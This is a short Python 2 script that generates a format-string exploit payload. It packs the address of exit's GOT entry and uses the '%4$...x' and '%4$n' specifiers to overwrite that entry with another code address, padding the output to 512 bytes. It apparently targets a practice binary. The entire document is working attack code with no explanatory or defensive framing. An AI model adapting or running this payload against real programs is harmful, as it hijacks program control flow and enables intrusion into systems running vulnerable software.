import struct

oAddr = struct.pack("I", 0x080484a4) # 134513828 dec

gotExitAddr = struct.pack("I", 0x8049838)

def pad(s):
    return s+"X"*(512-len(s))

pl = ""
pl += gotExitAddr
pl += "%4$134513824x"
pl += "%4$n"

print pad(pl)
